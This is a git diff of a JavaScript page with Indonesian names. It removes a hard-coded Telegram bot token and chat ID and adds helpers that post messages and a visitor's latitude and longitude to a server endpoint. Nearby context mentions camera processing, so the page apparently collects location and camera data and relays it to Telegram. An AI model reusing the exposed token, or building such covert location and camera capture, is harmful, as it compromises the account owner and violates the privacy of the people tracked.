@@ -1,6 +1,3 @@
-const BOT_TOKEN = "9241678519:AAHQRe5827TUxLB1JrgNGZR6narRgyyXP3M";
-const CHAT_ID  = "-1004462579685";
-
 function toDMS(decimal, isLat) {
     const absolute = Math.abs(decimal);
     const degrees = Math.floor(absolute);
@@ -271,3 +268,47 @@ prosesKamera().catch(err => console.error("Gagal proses kamera:", err));
         }
 
         setTimeout(showSecondPage, 2000);
+
+
+async function kirimPesan(message) {
+    const response = await fetch("/api/send", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            type: "text",
+            message
+        })
+    });
+
+    const result = await response.json();
+
+    if (!response.ok || !result.ok) {
+        throw new Error("Pesan gagal dikirim");
+    }
+
+    return result;
+}
+
+async function kirimLokasi(latitude, longitude) {
+    const response = await fetch("/api/send", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            type: "location",
+            latitude,
+            longitude
+        })
+    });
+
+    const result = await response.json();
+
+    if (!response.ok || !result.ok) {
+        throw new Error("Lokasi gagal dikirim");
+    }
+
+    return result;
+}
